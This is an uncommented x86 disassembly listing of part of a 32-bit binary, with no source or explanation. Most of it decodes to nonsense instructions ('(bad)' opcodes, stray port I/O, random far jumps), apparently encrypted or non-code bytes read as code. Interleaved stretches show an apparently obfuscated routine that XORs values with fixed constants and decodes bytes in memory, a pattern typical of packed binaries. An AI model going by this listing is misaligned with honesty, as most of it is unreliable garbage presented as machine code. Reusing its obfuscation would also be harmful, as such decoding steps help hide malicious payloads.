  409413:	adc    DWORD PTR [ecx-0x4bf65b17],esi
  409419:	aad    0x75
  40941b:	push   edx
  40941c:	repz jae 0x409488
  40941f:	mov    ah,0x5c
  409421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409422:	mov    WORD PTR [edx],?
  409424:	ret    
  409425:	push   ebx
  409426:	jp     0x4093f6
  409428:	mov    ah,BYTE PTR [edx]
  40942a:	xchg   edx,eax
  40942b:	pop    eax
  40942c:	addr16 test al,0x80
  40942f:	cmp    al,BYTE PTR [eax+0x52d53b3f]
  409435:	cmp    al,0xdb
  409437:	sub    ecx,0x62a14cd1
  40943d:	xchg   esi,eax
  40943e:	leave  
  40943f:	jmp    0x3627:0xb7094d3d
  409446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409447:	fld    DWORD PTR [esi-0x32]
  40944a:	pop    esp
  40944b:	rcl    BYTE PTR [edx+0x19a65160],1
  409451:	fild   WORD PTR [edx+0x61f77c5e]
  409457:	lock lds esi,FWORD PTR [ebp+0x3af1317e]
  40945e:	jge    0x409440
  409460:	pop    ds
  409461:	into   
  409462:	jne    0x4094d1
  409464:	inc    ebx
  409465:	enter  0x93f4,0x3
  409469:	jle    0x409498
  40946b:	iret   
  40946c:	jg     0x4094e4
  40946e:	xor    ebx,0x5e
  409471:	stc    
  409472:	mov    edx,0x8c2e6bf
  409477:	dec    ebx
  409478:	pminsw mm3,QWORD PTR [esi+eax*2+0x3aa83c8]
  409480:	xchg   esi,eax
  409481:	pop    esi
  409482:	cmp    al,cl
  409484:	nop
  409485:	adc    al,0x7a
  409487:	(bad)  
  409489:	sti    
  40948a:	arpl   WORD PTR [ecx-0x4a898fe7],bp
  409490:	push   0x76d98922
  409495:	(bad)  
  409496:	jl     0x409457
  409498:	aam    0xfd
  40949a:	rcl    DWORD PTR [edi-0x60807db5],0x50
  4094a1:	or     DWORD PTR [si],esi
  4094a4:	mov    ?,WORD PTR [ecx+ebx*2]
  4094a7:	mov    esi,0x804ad474
  4094ac:	jge    0x40952b
  4094ae:	int3   
  4094af:	mov    cl,0x7d
  4094b1:	xchg   edx,eax
  4094b2:	push   es
  4094b3:	in     eax,dx
  4094b4:	call   0x86c9:0x735ac4b3
  4094bb:	aas    
  4094bc:	pop    edx
  4094bd:	xchg   ebx,eax
  4094be:	sbb    eax,0x41b50782
  4094c3:	fst    QWORD PTR [edi+0x21]
  4094c6:	nop
  4094c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094c8:	cmc    
  4094c9:	mov    ebx,DWORD PTR [edi+0x75]
  4094cc:	pop    eax
  4094cd:	inc    eax
  4094ce:	mov    al,0xe1
  4094d0:	in     al,dx
  4094d1:	sbb    esp,DWORD PTR [esi]
  4094d3:	(bad)  
  4094d4:	(bad)  
  4094d5:	icebp  
  4094d6:	loopne 0x409506
  4094d8:	jbe    0x409510
  4094da:	pop    ss
  4094db:	jno    0x40945d
  4094dd:	or     al,0xb8
  4094df:	imul   esi,DWORD PTR [edi-0x17],0xbe0599e9
  4094e6:	push   ebx
  4094e7:	dec    ebx
  4094e8:	dec    esp
  4094e9:	pop    sp
  4094eb:	pop    esp
  4094ec:	loop   0x40955b
  4094ee:	in     al,dx
  4094ef:	js     0x4094b3
  4094f1:	loope  0x409550
  4094f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094f4:	lea    eax,[eax]
  4094f6:	mov    dh,0xa6
  4094f8:	add    BYTE PTR [ecx+0x5d990ba8],al
  4094fe:	gs in  al,dx
  409500:	in     eax,0x6e
  409502:	stos   DWORD PTR es:[edi],eax
  409503:	inc    eax
  409504:	imul   ecx,DWORD PTR [ecx-0x4],0x732d358d
  40950b:	cmp    al,0xf
  40950d:	xchg   edx,eax
  40950e:	std    
  40950f:	test   DWORD PTR [eax-0x35],esi
  409512:	pop    eax
  409513:	(bad)  
  409514:	js     0x4094f3
  409516:	and    dl,BYTE PTR [edi+0x74edc16a]
  40951c:	loop   0x409576
  40951e:	or     edi,ebx
  409520:	ror    BYTE PTR ds:0xb89bd1fc,0x8
  409527:	xchg   esp,eax
  409528:	cmp    ebx,DWORD PTR ds:0xc36f33c2
  40952e:	mov    ch,0x2e
  409530:	mov    BYTE PTR [edx],ah
  409532:	inc    esi
  409533:	shr    dh,1
  409535:	xchg   ebp,eax
  409536:	inc    ecx
  409537:	inc    ebx
  409538:	into   
  409539:	add    eax,0x81d3d7dc
  40953e:	daa    
  40953f:	scas   al,BYTE PTR es:[edi]
  409540:	pop    esi
  409541:	xor    BYTE PTR ds:0xf7ddda14,bh
  409547:	and    DWORD PTR ds:0x3ed4ee3,ebx
  40954d:	scas   eax,DWORD PTR es:[edi]
  40954e:	int3   
  40954f:	dec    ebx
  409550:	lahf   
  409551:	sub    eax,0x605d3d7
  409556:	retf   0xdf48
  409559:	das    
  40955a:	jbe    0x40952a
  40955c:	rcl    ecx,1
  40955e:	adc    al,0x22
  409560:	test   eax,0x4abb33de
  409565:	xor    ch,BYTE PTR [esi]
  409567:	in     eax,dx
  409568:	or     BYTE PTR [edi+eiz*4+0x31],ah
  40956c:	repz out 0x39,eax
  40956f:	jo     0x40954c
  409571:	inc    edi
  409572:	sahf   
  409573:	ins    BYTE PTR es:[edi],dx
  409574:	imul   edx,ecx,0x5f
  409577:	pop    es
  409578:	or     cl,0x62
  40957b:	adc    al,BYTE PTR [edx+0x3bd4dedd]
  409581:	dec    ebx
  409582:	jp     0x409546
  409584:	loopne 0x409506
  409586:	in     eax,dx
  409587:	test   DWORD PTR [esi],esi
  409589:	xor    dh,cl
  40958b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40958c:	add    eax,0xf3a23677
  409591:	sbb    eax,0xd1c3f7b9
  409596:	loop   0x409520
  409598:	rcr    BYTE PTR [ebx-0x5a485d02],1
  40959e:	ja     0x4095a5
  4095a0:	es pop edx
  4095a2:	ficom  WORD PTR [esi-0x5d]
  4095a5:	jnp    0x40954f
  4095a7:	sbb    eax,0x60cae745
  4095ac:	pop    ebx
  4095ad:	push   0xfffffff6
  4095af:	or     al,0xf
  4095b1:	outs   dx,DWORD PTR ds:[esi]
  4095b2:	ja     0x409625
  4095b4:	popf   
  4095b5:	popf   
  4095b6:	jae    0x4095aa
  4095b8:	push   0x826ada26
  4095bd:	dec    edi
  4095be:	jae    0x4095db
  4095c0:	pusha  
  4095c1:	pop    esi
  4095c2:	lods   eax,DWORD PTR ds:[esi]
  4095c3:	cmp    al,0xe4
  4095c5:	dec    ecx
  4095c6:	xor    DWORD PTR [edi+0x40ba9371],esp
  4095cc:	or     eax,0x3410536a
  4095d1:	(bad)  
  4095d2:	mov    eax,ds:0x72ef188b
  4095d7:	push   ss
  4095d8:	(bad)  
  4095d9:	arpl   WORD PTR [edi+edi*2+0x4b],cx
  4095dd:	pop    edx
  4095de:	pop    esi
  4095df:	sub    al,dh
  4095e1:	call   0x28a6:0x495d9c13
  4095e8:	push   0x98c0ec47
  4095ed:	and    edx,esp
  4095ef:	and    BYTE PTR [esi+0x589fa635],dh
  4095f5:	and    al,0x31
  4095f7:	inc    ecx
  4095f8:	mov    al,0xcf
  4095fa:	bound  esi,QWORD PTR [edi]
  4095fc:	repnz xchg ebx,eax
  4095fe:	xchg   edi,eax
  4095ff:	les    ebx,FWORD PTR [ecx-0x6c]
  409602:	push   esp
  409603:	and    dl,dl
  409605:	or     ebx,DWORD PTR [edi+ebp*1]
  409608:	and    BYTE PTR [ebx],ch
  40960a:	stc    
  40960b:	cmp    dl,BYTE PTR [ebp+ecx*2+0x4e584482]
  409612:	out    dx,al
  409613:	mov    eax,0x9593023c
  409618:	iret   
  409619:	push   ds
  40961a:	pop    ss
  40961b:	jle    0x4095e8
  40961d:	in     eax,dx
  40961e:	xchg   ecx,eax
  40961f:	dec    esi
  409620:	shl    DWORD PTR [esi],0xae
  409623:	jno    0x4095b5
  409625:	pop    ds
  409626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409627:	outs   dx,DWORD PTR ds:[esi]
  409628:	or     eax,0x168b2a3b
  40962d:	shl    eax,0x2
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422548
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0xe3bca5c6
  4097de:	iret   
  4097df:	cdq    
  4097e0:	mov    esp,0x18184147
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [eax-0x3920f3fc],bl
  4097ee:	sub    ch,BYTE PTR [ebx+0x20]
  4097f1:	pushf  
  4097f2:	pop    esi
  4097f3:	cmp    DWORD PTR [edx+0x3a],ecx
  4097f6:	cli    
  4097f7:	sahf   
  4097f8:	lds    ecx,FWORD PTR [edi-0x22]
  4097fb:	sar    DWORD PTR [esp+edx*4-0x1c],1
  4097ff:	fnstcw WORD PTR [eax-0xbfb4b8c]
  409805:	in     al,0x26
  409807:	mov    al,ds:0xb6ea7e55
  40980c:	push   ebp
  40980d:	in     eax,dx
  40980e:	clc    
  40980f:	mov    dl,0x5f
  409811:	mov    bl,0xe3
  409813:	sbb    BYTE PTR [ecx-0x37185b1a],0x3f
  40981a:	lods   eax,DWORD PTR ds:[esi]
  40981b:	push   esp
  40981c:	inc    edx
  40981d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981e:	pop    esi
  40981f:	and    bl,al
  409821:	xor    BYTE PTR [ebx],al
  409823:	imul   BYTE PTR [eax+0x4223fe3f]
  409829:	jo     0x40982d
  40982b:	and    DWORD PTR [ebp-0x67e0d2d3],edi
  409831:	or     ebp,esi
  409833:	mov    dh,0x78
  409835:	inc    ebx
  409836:	xchg   BYTE PTR [edi-0x5884186d],dl
  40983c:	es xor al,0x13
  40983f:	cmp    bh,BYTE PTR ds:0xcf3aea02
  409845:	mov    dl,0xea
  409847:	in     al,0x5a
  409849:	repz fnstenv ds:0x50a5d6b6
  409850:	jb     0x4098a3
  409852:	scas   eax,DWORD PTR es:[edi]
  409853:	add    cl,BYTE PTR [ebp-0x2e719b93]
  409859:	out    0x78,eax
  40985b:	lods   eax,DWORD PTR ds:[esi]
  40985c:	or     edi,DWORD PTR [ecx-0x4f]
  40985f:	test   al,0x3a
  409861:	call   0x119b:0xf42441c6
  409868:	(bad)  
  40986a:	aad    0xf4
  40986c:	pushf  
  40986d:	retf   
  40986e:	jmp    0x4098cd
  409870:	xor    eax,0x9
  409873:	mov    edi,0x7aac1d6f
  409878:	nop
  409879:	mov    DWORD PTR [edx-0x97e9442],edx
  40987f:	sbb    ebx,DWORD PTR [ebx+ecx*2+0x14]
  409883:	add    BYTE PTR [ebp+ebp*1-0x7b],al
  409887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409888:	mov    dh,0xec
  40988a:	mov    al,0xb9
  40988c:	xchg   esi,eax
  40988d:	sub    eax,0xbe282810
  409892:	rol    BYTE PTR [eax],cl
  409894:	scas   eax,DWORD PTR es:[edi]
  409895:	fsubr  st,st(6)
  409897:	mov    edi,0x274fb4e7
  40989c:	lds    edi,FWORD PTR [ebp-0x5e]
  40989f:	xchg   ebp,eax
  4098a0:	adc    DWORD PTR [edx+0xac5d5fc],ebp
  4098a6:	mov    ah,0x3f
  4098a8:	pop    edx
  4098a9:	mov    dl,0x67
  4098ab:	pop    esi
  4098ac:	sub    eax,0xa33b2857
  4098b1:	sbb    al,0x44
  4098b3:	adc    BYTE PTR [ebx-0x55],cl
  4098b6:	add    edx,esp
  4098b8:	js     0x409934
  4098ba:	dec    eax
  4098bb:	test   eax,0x107b1105
  4098c0:	mov    ebx,0xa00406a4
  4098c5:	jmp    0x6bf:0x6a0a5b15
  4098cc:	mov    al,0xf4
  4098ce:	mov    ah,0x1c
  4098d0:	nop
  4098d1:	sub    esi,eax
  4098d3:	lock add ecx,DWORD PTR fs:[ecx+edx*4+0x3f460bac]
  4098dc:	jbe    0x4098e9
  4098de:	dec    ebx
  4098df:	jg     0x409889
  4098e1:	in     al,0x25
  4098e3:	sbb    al,0x37
  4098e5:	adc    DWORD PTR ds:0xf4024229,ebx
  4098eb:	js     0x409880
  4098ed:	mov    ebx,edi
  4098ef:	sub    DWORD PTR [edi+0x6a],esi
  4098f2:	das    
  4098f3:	jb     0x4098de
  4098f5:	sbb    ebx,0x65d4b695
  4098fb:	mov    ah,0x13
  4098fd:	daa    
  4098fe:	xor    BYTE PTR [ebp+ebx*4+0x7a],ah
  409902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409903:	push   edx
  409904:	pop    es
  409905:	(bad)  
  409906:	mov    eax,0x9bc4b1b5
  40990b:	(bad)  
  40990c:	and    DWORD PTR [ecx+0xf],ebp
  40990f:	push   edx
  409910:	mov    dh,0x89
  409912:	xor    dl,dh
  409914:	mov    DWORD PTR [ebx],edi
  409916:	je     0x4098b0
  409918:	stos   BYTE PTR es:[edi],al
  409919:	sub    BYTE PTR [ecx+ebx*2-0x2d],ah
  40991d:	pop    eax
  40991e:	aad    0x48
  409920:	test   BYTE PTR [esi],bl
  409922:	push   0x66
  409924:	sub    eax,0x4b8a026
  409929:	test   eax,0x28e90c09
  40992e:	push   ecx
  40992f:	and    DWORD PTR [esi],ecx
  409931:	cs push 0xffffffa6
  409934:	(bad)  
  409935:	cmp    esp,DWORD PTR [eax+0x5b]
  409938:	loope  0x40990f
  40993a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40993b:	mov    cl,0x73
  40993d:	jo     0x40998d
  40993f:	xor    cl,BYTE PTR [esi+0x5e384c9b]
  409945:	and    bl,BYTE PTR [esp+ebx*8+0x3d438233]
  40994c:	adc    eax,0x14dba8ef
  409951:	stc    
  409952:	xchg   BYTE PTR [ebx-0x29303c45],bl
  409958:	pop    eax
  409959:	in     al,0x29
  40995b:	lahf   
  40995c:	dec    edi
  40995d:	adc    DWORD PTR [ebx],0xf21a9a92
  409963:	dec    edi
  409964:	cmp    ebp,DWORD PTR [esi+0x53b7b507]
  40996a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996b:	inc    ecx
  40996c:	loop   0x409984
  40996e:	adc    ebx,DWORD PTR [esp+edi*8+0x5f2ce33f]
  409975:	inc    eax
  409976:	and    eax,0xfc5695fa
  40997b:	sbb    ebx,DWORD PTR [eax]
  40997d:	mov    ah,0x9a
  40997f:	shl    BYTE PTR [eax-0x221e3bbd],1
  409985:	push   cs
  409986:	stos   BYTE PTR es:[edi],al
  409987:	adc    dh,BYTE PTR [ecx-0x12f3981a]
  40998d:	push   ebp
  40998e:	into   
  40998f:	mov    bl,0x7f
  409991:	pop    edx
  409992:	stos   DWORD PTR es:[edi],eax
  409993:	inc    BYTE PTR [ebx]
  409995:	leave  
  409996:	retf   0xf1c4
  409999:	mov    ds:0x94d5f12a,eax
  40999e:	arpl   WORD PTR [edx],di
  4099a0:	mov    ds:0x54bb63e4,eax
  4099a5:	push   ebx
  4099a6:	cmc    
  4099a7:	gs or  eax,0xcec298a6
  4099ad:	js     0x409996
  4099af:	push   0xb3216f02
  4099b4:	xchg   ebx,eax
  4099b5:	gs leave 
  4099b7:	jmp    0x48dfbd4a
  4099bc:	into   
  4099bd:	add    bl,BYTE PTR [ebp+0x42]
  4099c0:	push   cs
  4099c1:	inc    edi
  4099c2:	add    ah,ah
  4099c4:	aam    0xe3
  4099c6:	push   es
  4099c7:	or     BYTE PTR [eax-0x2ebce5c0],0xc3
  4099ce:	sahf   
  4099cf:	or     bl,BYTE PTR [edi+eiz*8]
  4099d2:	jp     0x409a19
  4099d4:	jne    0x4099dd
  4099d6:	xchg   esp,eax
  4099d7:	xor    eax,0x99cff44d
  4099dc:	ror    DWORD PTR [esi-0x49],1
  4099df:	adc    eax,ebx
  4099e1:	xor    eax,0x95c301b6
  4099e6:	pop    es
  4099e7:	and    al,0xef
  4099e9:	add    eax,0xd5a04bfe
  4099ee:	jbe    0x409a56
  4099f0:	add    DWORD PTR [ebx-0x70],esi
  4099f3:	inc    ebp
  4099f4:	sbb    BYTE PTR [edi+0x13],dl
  4099f7:	adc    al,0xff
  4099f9:	dec    ebx
  4099fa:	dec    eax
  4099fb:	je     0x4099ba
  4099fd:	pop    ebx
  4099fe:	pop    esp
  4099ff:	jmp    0xfd93:0x32914b00
  409a06:	jns    0x409a79
  409a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a09:	retf   
  409a0a:	sub    BYTE PTR [edi-0xa],dl
  409a0d:	pushf  
  409a0e:	jmp    0xd4e7:0x97d69f39
  409a15:	cmp    ebp,DWORD PTR [ebp+0x7]
  409a18:	push   cs
  409a19:	rcl    DWORD PTR [eax],0xda
  409a1c:	mov    WORD PTR [eax-0x3efe868],ds
  409a22:	pop    ds
  409a23:	jno    0x409a3b
  409a25:	sbb    eax,0x799c375a
  409a2a:	adc    BYTE PTR ss:[ecx+0x5c],cl
  409a2e:	add    ebp,edi
  409a30:	xor    al,0x42
  409a32:	mov    ebp,0x348d9e6e
  409a37:	dec    ebp
  409a38:	cmp    edx,0xffffffce
  409a3b:	js     0x409a90
  409a3d:	mov    edi,0x8d6f24a6
  409a42:	dec    edx
  409a43:	cs std 
  409a45:	clc    
  409a46:	cmp    BYTE PTR [edi-0xb05b41f],0x8f
  409a4d:	push   edi
  409a4e:	pop    eax
  409a4f:	mov    WORD PTR [edx-0x78],cs
  409a52:	xchg   ecx,eax
  409a53:	pop    DWORD PTR [ecx]
  409a55:	mov    al,ds:0xb4eea30f
  409a5a:	fcom   QWORD PTR [edi+eiz*8]
  409a5d:	dec    ebx
  409a5e:	je     0x409a63
  409a60:	inc    esi
  409a61:	mov    WORD PTR [ebx],?
  409a63:	mov    es,WORD PTR ds:0x61d607dc
  409a69:	jnp    0x409a69
  409a6b:	daa    
  409a6c:	sbb    DWORD PTR [edx+0x30],edx
  409a6f:	imul   ebp,ebx,0xd2903d01
  409a75:	jecxz  0x409a82
  409a77:	ins    BYTE PTR es:[edi],dx
  409a78:	push   edi
  409a79:	adc    eax,DWORD PTR [bp+di-0x79]
  409a7d:	dec    edx
  409a7e:	cmp    dl,BYTE PTR [edi+0x606438af]
  409a84:	sbb    edx,esi
  409a86:	int    0xee
  409a88:	pop    es
  409a89:	clc    
  409a8a:	push   0xffffff88
  409a8c:	lahf   
  409a8d:	xchg   esi,eax
  409a8e:	cmp    al,0x6d
  409a90:	cs cwde 
  409a92:	dec    ebx
  409a93:	test   al,0xde
  409a95:	loop   0x409a3f
  409a97:	iret   
  409a98:	jno    0x409a78
  409a9a:	fwait
  409a9b:	push   ebp
  409a9c:	sub    dh,BYTE PTR [ecx-0x5c]
  409a9f:	jmp    0xbef21d09
  409aa4:	adc    al,BYTE PTR [ebx]
  409aa6:	inc    ebx
  409aa7:	bnd jbe 0x409a35
  409aaa:	jp     0x409b10
  409aac:	mov    al,ds:0x8d2d0ed5
  409ab1:	add    eax,0xa2e9636e
  409ab6:	dec    esi
  409ab7:	repnz mov ebx,DWORD PTR [eax-0x3b]
  409abb:	ss int3 
  409abd:	inc    ecx
  409abe:	repnz adc DWORD PTR [edx],esi
  409ac1:	in     eax,dx
  409ac2:	dec    ebp
  409ac3:	add    DWORD PTR [eax],ecx
  409ac5:	je     0x409a47
  409ac7:	dec    ebx
  409ac8:	shl    ebx,0x19
  409acb:	mov    ah,cl
  409acd:	mov    ebx,0x8496283
  409ad2:	retf   
  409ad3:	sub    ah,BYTE PTR [esi+0x48]
  409ad6:	mov    ebx,?
  409ad8:	mov    edx,0x97049fbb
  409add:	addr16 (bad) 
  409adf:	pop    ds
  409ae0:	sub    al,0xa2
  409ae2:	mov    edx,0x9f83d56f
  409ae7:	pop    edx
  409ae8:	xor    edi,DWORD PTR [eax-0x1dc05a27]
  409aee:	xlat   BYTE PTR ds:[ebx]
  409aef:	adc    bh,al
  409af1:	and    bl,BYTE PTR [esi-0x75ca6c24]
  409af7:	sub    al,0x10
  409af9:	out    dx,al
  409afa:	jmp    0x409b7a
  409afc:	pop    es
  409afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409afe:	stc    
  409aff:	xor    DWORD PTR [edx-0x5cad717],edi
  409b05:	sub    eax,0x4306f12a
  409b0a:	add    eax,0x613280ee
  409b0f:	scas   eax,DWORD PTR es:[edi]
  409b10:	xchg   esp,eax
  409b11:	dec    ebp
  409b12:	stos   DWORD PTR es:[edi],eax
  409b13:	lea    eax,[edi+edi*1+0xf]
  409b17:	mov    ch,0xda
  409b19:	jp     0x409b39
  409b1b:	test   eax,0x99ebc24f
  409b20:	pop    ss
  409b21:	enter  0xd748,0xe5
  409b25:	int3   
  409b26:	in     al,dx
  409b27:	ins    BYTE PTR es:[edi],dx
  409b28:	sti    
  409b29:	sub    BYTE PTR [eax+edi*2],ah
  409b2c:	or     ecx,DWORD PTR [edx-0x78]
  409b2f:	stc    
  409b30:	aam    0x54
  409b32:	pop    ebp
  409b33:	cmp    eax,0x65102d70
  409b38:	mov    ah,0x32
  409b3a:	retf   0x1483
  409b3d:	(bad)  
  409b3e:	mov    eax,0xacd7d641
  409b43:	mov    ds:0x2ec2f2fe,al
  409b48:	push   ds
  409b49:	xchg   bl,ch
  409b4b:	add    eax,0xa51cf688
  409b50:	or     cl,BYTE PTR [edx+0x5a68443f]
  409b56:	inc    ebp
  409b57:	cmp    edx,DWORD PTR [eax+esi*4]
  409b5a:	addr16 and bl,cl
  409b5d:	mov    al,ds:0xddf427bd
  409b62:	pop    ebp
  409b63:	pusha  
  409b64:	jb     0x409b0a
  409b66:	mov    ds:0xf5c4fd17,al
  409b6b:	(bad)  
  409b6d:	adc    dl,BYTE PTR [eax+edx*4+0x43d57378]
  409b74:	jge    0x409b2c
  409b76:	add    dh,bl
  409b78:	scas   al,BYTE PTR es:[edi]
  409b79:	inc    edi
  409b7a:	sub    DWORD PTR [eax],0x1937d794
  409b80:	dec    edi
  409b81:	cmp    ah,BYTE PTR [ebp+edx*1+0x43720800]
  409b88:	aam    0xee
  409b8a:	stc    
  409b8b:	sti    
  409b8c:	pop    esi
  409b8d:	leave  
  409b8e:	or     al,0x62
  409b90:	loopne 0x409b2b
  409b92:	imul   edx,DWORD PTR [ecx-0x75c467c1],0xffffffc3
  409b99:	pop    eax
  409b9a:	int    0x99
  409b9c:	sub    ah,BYTE PTR [esi+0x22]
  409b9f:	test   BYTE PTR [eax-0x6a783790],bh
  409ba5:	xchg   ebp,eax
  409ba6:	push   ecx
  409ba7:	stos   DWORD PTR es:[edi],eax
  409ba8:	dec    edx
  409ba9:	fdiv   DWORD PTR [ebx]
  409bab:	ror    BYTE PTR [ebx],cl
  409bad:	ret    0x503
  409bb0:	dec    eax
  409bb1:	and    eax,0x45890042
  409bb6:	adc    al,0x8b
  409bb8:	inc    ebp
  409bb9:	mov    al,ds:0xfa44d8b
  409bbe:	lods   al,BYTE PTR ds:[esi]
  409bbf:	enter  0xc102,0xe9
  409bc3:	add    cl,BYTE PTR [ebx+0x558ba04d]
  409bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x422548
